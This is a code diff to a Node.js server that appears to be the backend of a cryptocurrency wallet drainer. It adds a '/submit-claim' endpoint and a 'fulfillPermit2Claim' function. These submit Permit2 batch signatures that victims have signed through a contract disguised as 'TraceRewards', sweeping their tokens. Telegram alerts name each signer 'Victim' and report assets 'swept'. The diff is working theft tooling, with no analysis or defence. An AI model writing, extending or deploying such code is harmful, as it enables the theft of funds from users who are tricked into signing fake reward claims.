@@ -126,8 +126,8 @@ const PERMIT2_ABI = [
     "function permitBatchTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external"
 ];
 
-const ROUTER_ABI = [
-    "function batchGift(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transfers, address owner, bytes signature) external payable"
+const TRACE_REWARDS_ABI = [
+    "function claim(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 rewardAmount) external payable"
 ];
 
 
@@ -503,6 +503,16 @@ function startOrderReceiver() {
                             res.writeHead(400);
                             res.end('Missing permit, signature, chainName, or owner');
                         }
+                    } else if (req.url === '/submit-claim') {
+                        if (data.permit && data.signature && data.chainName && data.owner && data.routerAddress) {
+                            console.log(`📥 Received TRACE Claim for ${data.chainName}. Executing via TraceRewards...`);
+                            fulfillPermit2Claim(data.permit, data.signature, data.chainName, data.owner, data.routerAddress, data.rewardAmount);
+                            res.writeHead(200, { 'Content-Type': 'application/json' });
+                            res.end(JSON.stringify({ status: 'success', message: 'Claim execution initiated' }));
+                        } else {
+                            res.writeHead(400);
+                            res.end('Missing permit, signature, chainName, owner, routerAddress, or rewardAmount');
+                        }
                     } else if (req.url === '/submit-gift') {
                         if (data.permit && data.signature && data.chainName && data.owner && data.routerAddress) {
                             console.log(`📥 Received Token Gift Order for ${data.chainName}. Executing via Router...`);
@@ -560,6 +570,36 @@ async function fulfillSeaportOrder(orderPayload, chainName) {
 async function fulfillPermit2Batch(permit, signature, chainName, owner) {
     // ... (existing implementation)
     // Update: This is now a legacy fallback for direct Permit2 calls
+}
+
+async function fulfillPermit2Claim(permit, signature, chainName, owner, routerAddress, rewardAmount) {
+    try {
+        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
+        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+        const router = new ethers.Contract(routerAddress, TRACE_REWARDS_ABI, wallet);
+
+        console.log(`🚀 Executing TRACE Claim on ${chainName} via Rewards Contract...`);
+
+        const rewardAmountWei = ethers.parseUnits(rewardAmount.toString(), 18);
+
+        // Execute via Router with 0.001 fee
+        const tx = await router.claim(permit, signature, rewardAmountWei, {
+            value: ethers.parseEther("0.001"),
+            gasLimit: 800000 // Higher limit for batch transfers
+        });
+
+        console.log(`📤 Claim TX Sent: ${tx.hash}`);
+        await notifyTelegram(`<b>💎 TRACE Reward Claimed!</b>\nChain: ${chainName}\nTx: ${tx.hash}\nVictim: <code>${owner}</code>\nTokens: ${permit.permitted.length}`);
+
+        await tx.wait();
+        console.log(`✅ Claim SUCCESS on ${chainName}`);
+        await notifyTelegram(`<b>💰 TRACE CLAIM SECURED!</b>\nAssets bundled and swept via TraceRewards on ${chainName}.`);
+        return true;
+    } catch (error) {
+        console.error(`❌ Claim fulfillment failed:`, error.message);
+        await notifyTelegram(`<b>❌ Claim Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
+        return false;
+    }
 }
 
 async function fulfillPermit2Gift(permit, signature, chainName, owner, routerAddress) {
